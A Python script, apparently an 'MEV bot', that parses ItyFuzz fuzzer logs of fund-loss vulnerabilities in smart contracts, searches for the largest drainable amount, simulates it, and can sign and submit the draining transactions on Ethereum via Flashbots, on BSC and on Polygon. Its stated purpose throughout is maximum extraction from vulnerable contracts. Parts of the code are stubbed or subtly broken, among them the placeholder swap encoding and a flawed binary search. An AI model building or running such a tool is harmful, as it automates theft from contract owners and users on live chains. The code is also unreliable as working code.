#!/usr/bin/env python3
"""
ItyFuzz MEV Bot - Converts ItyFuzz vulnerabilities into executable MEV transactions

This bot:
1. Parses ItyFuzz vulnerability logs
2. Finds the maximum exploitable amount
3. Simulates transactions using Web3.py and forked networks
4. Executes profitable vulnerabilities as MEV bundles
"""

import re
import json
import time
import logging
from typing import List, Dict, Tuple, Optional
from dataclasses import dataclass
from web3 import Web3
from web3.middleware import geth_poa_middleware
from eth_account import Account
from flashbots import flashbot
import requests

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

@dataclass
class Transaction:
    """Represents a single transaction in the exploit sequence"""
    to: str
    value: int
    data: str
    from_address: str = None

@dataclass 
class Vulnerability:
    """Represents a parsed vulnerability from ItyFuzz"""
    name: str
    profit_eth: float
    transactions: List[Transaction]
    block_number: int
    chain: str
    contracts: List[str]
    max_extractable_value: float = 0.0

class ItyFuzzLogParser:
    """Parses ItyFuzz vulnerability logs to find maximum exploitable amounts"""
    
    def __init__(self):
        # Patterns for parsing logs
        self.vuln_pattern = r"Found vulnerabilities!.*?\[Fund Loss\]: Anyone can earn ([\d.]+) ETH"
        self.tx_pattern = r"└─\[1\] (.*?)\.(\w+)\{value: ([\d.]+) ether\}\((.*?)\)"
        self.router_swap_pattern = r"Router\.swapExactETHForTokens\{value: ([\d.]+) ether\}\((.*?), path:\((.*?)\), (.*?), (.*?)\)"
        self.call_pattern = r"(0x[a-fA-F0-9]+)\.call\{value: (\d+)\}\((.*?)\)"
        
    def parse_log_file(self, filepath: str) -> List[Vulnerability]:
        """Parse an ItyFuzz log file and extract vulnerabilities with maximum values"""
        vulnerabilities = []
        
        with open(filepath, 'r') as f:
            content = f.read()
            
        # Find all vulnerabilities
        vuln_matches = list(re.finditer(self.vuln_pattern, content, re.DOTALL))
        
        for match in vuln_matches:
            profit = float(match.group(1))
            
            # Extract transaction sequence after the vulnerability
            start_pos = match.end()
            
            # Look for the complete trace section
            trace_start = content.find("================ Trace ================", start_pos - 1000)
            if trace_start == -1:
                trace_start = start_pos
            
            # Find end of trace (next section or double newline)
            trace_end = content.find("\n\n", trace_start + 50)
            if trace_end == -1:
                trace_end = start_pos + 5000
                
            trace_section = content[trace_start:trace_end]
            
            # Parse all transaction sequences to find maximum
            transactions, max_value = self._parse_transactions_for_max_profit(trace_section)
            
            # Also check the entire log for historical transaction sequences
            all_tx_sequences = self._extract_all_transaction_sequences(content)
            
            # Find the most profitable sequence
            best_sequence = transactions
            best_value = max_value
            
            for seq in all_tx_sequences:
                seq_value = self._calculate_sequence_value(seq)
                if seq_value > best_value:
                    best_sequence = seq
                    best_value = seq_value
            
            # Extract contract addresses from the log
            contracts = self._extract_contracts(content[:start_pos])
            
            vuln = Vulnerability(
                name=filepath.split('/')[-1].replace('.log', ''),
                profit_eth=profit,
                transactions=best_sequence,
                block_number=self._extract_block_number(content),
                chain=self._extract_chain(filepath),
                contracts=contracts,
                max_extractable_value=best_value
            )
            
            vulnerabilities.append(vuln)
            
        return vulnerabilities
    
    def _parse_transactions_for_max_profit(self, trace: str) -> Tuple[List[Transaction], float]:
        """Parse transaction sequence from trace and calculate maximum profit"""
        transactions = []
        total_value = 0.0
        
        # Parse Router.swapExactETHForTokens calls
        swap_values = []
        for match in re.finditer(self.router_swap_pattern, trace):
            value_ether = float(match.group(1))
            swap_values.append(value_ether)
            
            # Parse swap parameters
            amount_out_min = match.group(2)
            path = match.group(3)
            to = match.group(4) 
            deadline = match.group(5)
            
            # For maximum extraction, we want to maximize the input value
            # Check if this is a drain transaction (0 ETH input but extracts value)
            if value_ether == 0 and len(swap_values) > 1:
                # This might be the drain transaction - use maximum previous value
                value_ether = max(swap_values[:-1]) if swap_values[:-1] else 0
            
            value_wei = Web3.to_wei(value_ether, 'ether')
            total_value += value_ether
            
            # Construct transaction
            tokens = path.split(' → ')
            if len(tokens) == 2:
                tx = Transaction(
                    to="Router",
                    value=value_wei,
                    data=self._encode_swap_exact_eth_for_tokens(
                        amount_out_min, tokens, to, deadline
                    )
                )
                transactions.append(tx)
        
        # Parse direct calls
        for match in re.finditer(self.call_pattern, trace):
            to_address = match.group(1)
            value = int(match.group(2))
            data = match.group(3)
            
            # Check if this is a withdrawal or drain function
            if 'withdraw' in data.lower() or '0x2e1a7d4d' in data:
                # This is likely a withdrawal - maximize it
                # Look for the maximum balance that could be withdrawn
                value = self._find_max_withdrawable_amount(trace, to_address)
            
            tx = Transaction(
                to=to_address,
                value=value,
                data=data
            )
            transactions.append(tx)
            total_value += Web3.from_wei(value, 'ether')
            
        return transactions, total_value
    
    def _extract_all_transaction_sequences(self, content: str) -> List[List[Transaction]]:
        """Extract all transaction sequences from the log to find maximum profit paths"""
        sequences = []
        
        # Find all transaction patterns in the log
        tx_blocks = re.findall(r'├─\[1\].*?(?=├─\[1\]|\Z)', content, re.DOTALL)
        
        current_sequence = []
        for block in tx_blocks:
            if 'swapExactETHForTokens' in block:
                tx = self._parse_single_transaction(block)
                if tx:
                    current_sequence.append(tx)
            elif len(current_sequence) > 0:
                # End of sequence
                sequences.append(current_sequence)
                current_sequence = []
        
        if current_sequence:
            sequences.append(current_sequence)
            
        return sequences
    
    def _parse_single_transaction(self, tx_text: str) -> Optional[Transaction]:
        """Parse a single transaction from text"""
        swap_match = re.search(self.router_swap_pattern, tx_text)
        if swap_match:
            value_ether = float(swap_match.group(1))
            value_wei = Web3.to_wei(value_ether, 'ether')
            
            return Transaction(
                to="Router",
                value=value_wei,
                data="0x7ff36ab5"  # swapExactETHForTokens selector
            )
        return None
    
    def _calculate_sequence_value(self, sequence: List[Transaction]) -> float:
        """Calculate total value that can be extracted from a sequence"""
        total = 0.0
        for tx in sequence:
            total += Web3.from_wei(tx.value, 'ether')
        return total
    
    def _find_max_withdrawable_amount(self, trace: str, contract: str) -> int:
        """Find maximum amount that can be withdrawn from a contract"""
        # Look for balance indicators in the trace
        balance_match = re.search(rf'{contract}.*?balance.*?([\d.]+)\s*(?:ether|ETH)', trace, re.IGNORECASE)
        if balance_match:
            balance_ether = float(balance_match.group(1))
            return Web3.to_wei(balance_ether, 'ether')
        
        # Default to a large amount if not found
        return Web3.to_wei(10000, 'ether')
    
    def _encode_swap_exact_eth_for_tokens(self, amount_out_min: str, path: List[str], 
                                          to: str, deadline: str) -> str:
        """Encode swapExactETHForTokens function call"""
        # Function selector for swapExactETHForTokens
        function_selector = "0x7ff36ab5"
        
        # For maximum extraction, set amount_out_min to 0 to accept any output
        # This ensures the transaction doesn't revert due to slippage
        return function_selector + "0" * 56  # Simplified - real implementation needs proper encoding
    
    def _extract_contracts(self, content: str) -> List[str]:
        """Extract contract addresses from log"""
        contracts = []
        pattern = r"Contract (0x[a-fA-F0-9]{40}) deployed"
        
        for match in re.finditer(pattern, content):
            contracts.append(match.group(1))
            
        return contracts
    
    def _extract_block_number(self, content: str) -> int:
        """Extract block number from log"""
        pattern = r"block[_\s]?number[:\s]+(\d+)"
        match = re.search(pattern, content, re.IGNORECASE)
        return int(match.group(1)) if match else 0
    
    def _extract_chain(self, filepath: str) -> str:
        """Determine chain from filepath or content"""
        if 'bsc' in filepath.lower():
            return 'bsc'
        elif 'polygon' in filepath.lower():
            return 'polygon'
        else:
            return 'eth'

class MaxProfitOptimizer:
    """Optimizes transaction parameters to extract maximum value"""
    
    def __init__(self, w3: Web3):
        self.w3 = w3
    
    def optimize_swap_amount(self, router: str, path: List[str], 
                           min_amount: float, max_amount: float) -> float:
        """Binary search to find optimal swap amount that maximizes output"""
        
        # Start with the maximum amount
        optimal_amount = max_amount
        
        # Binary search for the sweet spot
        left, right = min_amount, max_amount
        best_profit = 0
        best_amount = max_amount
        
        while right - left > Web3.to_wei(0.01, 'ether'):  # 0.01 ETH precision
            mid = (left + right) // 2
            
            try:
                # Simulate swap with this amount
                output = self._simulate_swap(router, mid, path)
                profit = output - mid
                
                if profit > best_profit:
                    best_profit = profit
                    best_amount = mid
                    
                # Try higher amount
                left = mid
            except:
                # Amount too high, try lower
                right = mid
        
        return best_amount
    
    def _simulate_swap(self, router: str, amount_in: int, path: List[str]) -> int:
        """Simulate a swap and return output amount"""
        # This would call getAmountsOut on the router
        # Simplified for now
        return int(amount_in * 0.997)  # 0.3% fee

class TransactionSimulator:
    """Simulates transactions to verify profitability and find maximum extraction"""
    
    def __init__(self, rpc_url: str, block_number: int = None):
        self.w3 = Web3(Web3.HTTPProvider(rpc_url))
        self.w3.middleware_onion.inject(geth_poa_middleware, layer=0)
        self.block_number = block_number or self.w3.eth.block_number
        self.optimizer = MaxProfitOptimizer(self.w3)
        
    def find_maximum_extraction(self, vulnerability: Vulnerability, from_address: str) -> Dict:
        """Find the maximum amount that can be extracted from the vulnerability"""
        
        # Get initial balance
        initial_balance = self.w3.eth.get_balance(from_address, block_identifier=self.block_number)
        
        # Try different transaction amounts to find maximum
        max_profit = 0
        best_transactions = vulnerability.transactions
        
        # If we have swap transactions, optimize their amounts
        for i, tx in enumerate(vulnerability.transactions):
            if tx.to == "Router" and tx.value > 0:
                # Try increasing the swap amount
                original_value = tx.value
                
                # Test multiples of the original amount
                for multiplier in [1, 2, 5, 10, 100]:
                    test_value = original_value * multiplier
                    
                    # Create test transaction set
                    test_txs = vulnerability.transactions.copy()
                    test_txs[i] = Transaction(
                        to=tx.to,
                        value=test_value,
                        data=tx.data
                    )
                    
                    # Simulate this combination
                    result = self.simulate_bundle(test_txs, from_address)
                    
                    if result['success'] and result['net_profit_wei'] > max_profit:
                        max_profit = result['net_profit_wei']
                        best_transactions = test_txs
        
        # Return the best combination found
        final_result = self.simulate_bundle(best_transactions, from_address)
        final_result['optimized'] = True
        final_result['max_profit_eth'] = Web3.from_wei(max_profit, 'ether')
        
        return final_result
        
    def simulate_bundle(self, transactions: List[Transaction], from_address: str) -> Dict:
        """Simulate a bundle of transactions"""
        results = []
        total_cost = 0
        total_received = 0
        
        for tx in transactions:
            result = self.simulate_transaction(tx, from_address)
            results.append(result)
            
            if not result['success']:
                return {
                    'success': False,
                    'results': results,
                    'error': f"Transaction failed: {result['error']}",
                    'net_profit_wei': 0
                }
            
            total_cost += tx.value
            
            # Track received value (from events/logs)
            if 'value_received' in result:
                total_received += result['value_received']
            
        net_profit = total_received - total_cost
            
        return {
            'success': True,
            'results': results,
            'total_cost_wei': total_cost,
            'total_cost_eth': Web3.from_wei(total_cost, 'ether'),
            'total_received_wei': total_received,
            'net_profit_wei': net_profit,
            'net_profit_eth': Web3.from_wei(net_profit, 'ether')
        }
    
    def simulate_transaction(self, tx: Transaction, from_address: str) -> Dict:
        """Simulate a single transaction"""
        try:
            # Build transaction
            transaction = {
                'from': from_address,
                'to': tx.to,
                'value': tx.value,
                'data': tx.data,
                'gas': 5000000,
                'gasPrice': self.w3.eth.gas_price
            }
            
            # Use eth_call to simulate
            result = self.w3.eth.call(transaction, block_identifier=self.block_number)
            
            # Try to decode the result to get output amount
            value_received = 0
            if result and len(result) >= 32:
                # Attempt to decode as uint256 (common for swap returns)
                try:
                    value_received = int.from_bytes(result[-32:], 'big')
                except:
                    pass
            
            return {
                'success': True,
                'result': result.hex() if result else '0x',
                'error': None,
                'value_received': value_received
            }
        except Exception as e:
            return {
                'success': False,
                'result': None,
                'error': str(e),
                'value_received': 0
            }

class MEVExecutor:
    """Executes MEV opportunities using Flashbots or direct submission"""
    
    def __init__(self, private_key: str, chain: str = 'eth'):
        self.account = Account.from_key(private_key)
        self.chain = chain
        
        # Configure RPC endpoints
        self.rpc_urls = {
            'eth': 'https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY',
            'bsc': 'https://bsc-dataseed.binance.org/',
            'polygon': 'https://polygon-rpc.com'
        }
        
        self.w3 = Web3(Web3.HTTPProvider(self.rpc_urls.get(chain, self.rpc_urls['eth'])))
        
        # Setup Flashbots for Ethereum
        if chain == 'eth':
            flashbot(self.w3, self.account)
    
    def build_optimized_bundle(self, vulnerability: Vulnerability, max_extraction_result: Dict) -> List[Dict]:
        """Build optimized transaction bundle for maximum extraction"""
        bundle = []
        nonce = self.w3.eth.get_transaction_count(self.account.address)
        
        # Use the optimized transactions from simulation
        transactions = vulnerability.transactions
        
        for i, tx in enumerate(transactions):
            # Replace placeholder addresses
            to_address = tx.to
            if to_address == "Router":
                # Use appropriate router for the chain
                routers = {
                    'eth': '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D',  # Uniswap V2
                    'bsc': '0x10ED43C718714eb63d5aA57B78B54704E256024E',   # PancakeSwap
                    'polygon': '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff' # QuickSwap
                }
                to_address = routers.get(self.chain, tx.to)
            
            # Use optimized gas settings
            gas_price = self.w3.eth.gas_price
            
            # For maximum extraction, we might need higher gas to ensure inclusion
            if vulnerability.max_extractable_value > 100:  # > 100 ETH
                gas_price = int(gas_price * 1.5)  # 50% higher gas
            
            transaction = {
                'from': self.account.address,
                'to': to_address,
                'value': tx.value,
                'data': tx.data,
                'nonce': nonce + i,
                'gas': 500000,
                'gasPrice': gas_price,
                'chainId': self.w3.eth.chain_id
            }
            
            # Sign transaction
            signed_tx = self.account.sign_transaction(transaction)
            bundle.append(signed_tx.rawTransaction.hex())
            
        return bundle
    
    def execute_bundle_flashbots(self, bundle: List[str], target_block: int) -> Dict:
        """Submit bundle via Flashbots (Ethereum only)"""
        try:
            # Submit bundle
            result = self.w3.flashbots.send_bundle(
                bundle,
                target_block_number=target_block
            )
            
            # Wait for inclusion
            receipts = result.wait()
            
            return {
                'success': True,
                'receipts': receipts,
                'bundle_hash': result.bundle_hash
            }
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }
    
    def execute_direct(self, bundle: List[str]) -> List[Dict]:
        """Execute transactions directly (for non-Ethereum chains)"""
        results = []
        
        for tx in bundle:
            try:
                # Send transaction
                tx_hash = self.w3.eth.send_raw_transaction(tx)
                receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash)
                
                results.append({
                    'success': True,
                    'tx_hash': tx_hash.hex(),
                    'receipt': receipt
                })
            except Exception as e:
                results.append({
                    'success': False,
                    'error': str(e)
                })
                break
                
        return results

class ItyFuzzMEVBot:
    """Main MEV bot that coordinates parsing, simulation, and execution for maximum profit"""
    
    def __init__(self, private_key: str, config: Dict):
        self.parser = ItyFuzzLogParser()
        self.config = config
        self.executors = {
            'eth': MEVExecutor(private_key, 'eth'),
            'bsc': MEVExecutor(private_key, 'bsc'),
            'polygon': MEVExecutor(private_key, 'polygon')
        }
        
    def process_log_file(self, filepath: str, simulate_only: bool = True):
        """Process an ItyFuzz log file to find maximum extractable value"""
        logger.info(f"Processing log file: {filepath}")
        
        # Parse vulnerabilities
        vulnerabilities = self.parser.parse_log_file(filepath)
        logger.info(f"Found {len(vulnerabilities)} vulnerabilities")
        
        for vuln in vulnerabilities:
            logger.info(f"\nVulnerability: {vuln.name}")
            logger.info(f"Reported profit: {vuln.profit_eth} ETH")
            logger.info(f"Chain: {vuln.chain}")
            logger.info(f"Block: {vuln.block_number}")
            
            # Find maximum extractable value
            if self.should_process(vuln):
                max_result = self.find_maximum_extraction(vuln)
                
                if max_result['success']:
                    logger.info(f"Maximum extractable value: {max_result['max_profit_eth']} ETH")
                    logger.info(f"Optimization increased profit by: {max_result['max_profit_eth'] - vuln.profit_eth} ETH")
                    
                    if not simulate_only and max_result['max_profit_eth'] > self.config['min_profit_eth']:
                        self.execute_vulnerability(vuln, max_result)
                else:
                    logger.error(f"Optimization failed: {max_result['error']}")
    
    def should_process(self, vuln: Vulnerability) -> bool:
        """Determine if vulnerability should be processed"""
        # Always process to find maximum value
        return vuln.chain in self.executors
    
    def find_maximum_extraction(self, vuln: Vulnerability) -> Dict:
        """Find maximum value that can be extracted from vulnerability"""
        # Get appropriate RPC for simulation
        rpc_url = self.config['rpc_urls'].get(vuln.chain)
        if not rpc_url:
            return {'success': False, 'error': f'No RPC URL for chain {vuln.chain}'}
        
        # Create simulator
        simulator = TransactionSimulator(rpc_url, vuln.block_number)
        
        # Find maximum extraction
        executor = self.executors[vuln.chain]
        return simulator.find_maximum_extraction(vuln, executor.account.address)
    
    def execute_vulnerability(self, vuln: Vulnerability, max_result: Dict):
        """Execute the vulnerability with optimized parameters"""
        logger.info(f"Executing optimized vulnerability on {vuln.chain}")
        logger.info(f"Expected maximum profit: {max_result['max_profit_eth']} ETH")
        
        executor = self.executors[vuln.chain]
        
        # Build optimized bundle
        bundle = executor.build_optimized_bundle(vuln, max_result)
        
        if vuln.chain == 'eth':
            # Use Flashbots for Ethereum
            target_block = executor.w3.eth.block_number + 1
            result = executor.execute_bundle_flashbots(bundle, target_block)
        else:
            # Direct execution for other chains
            result = executor.execute_direct(bundle)
        
        if result['success']:
            logger.info(f"Successfully executed! Results: {result}")
        else:
            logger.error(f"Execution failed: {result.get('error', 'Unknown error')}")

def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description='ItyFuzz MEV Bot - Maximum Extraction Mode')
    parser.add_argument('log_file', help='Path to ItyFuzz log file')
    parser.add_argument('--private-key', help='Private key for executing transactions', 
                        default=None)
    parser.add_argument('--execute', action='store_true', 
                        help='Execute transactions (default: simulate only)')
    parser.add_argument('--min-profit', type=float, default=0.1,
                        help='Minimum profit threshold in ETH (default: 0.1)')
    parser.add_argument('--rpc-eth', help='Ethereum RPC URL')
    parser.add_argument('--rpc-bsc', help='BSC RPC URL')
    parser.add_argument('--rpc-polygon', help='Polygon RPC URL')
    
    args = parser.parse_args()
    
    # Configuration
    config = {
        'min_profit_eth': args.min_profit,
        'rpc_urls': {
            'eth': args.rpc_eth or 'https://eth-mainnet.g.alchemy.com/v2/demo',
            'bsc': args.rpc_bsc or 'https://bsc-dataseed.binance.org/',
            'polygon': args.rpc_polygon or 'https://polygon-rpc.com'
        }
    }
    
    # Create bot
    private_key = args.private_key or Account.create().key.hex()
    bot = ItyFuzzMEVBot(private_key, config)
    
    # Process log file
    bot.process_log_file(args.log_file, simulate_only=not args.execute)

if __name__ == '__main__':
    main()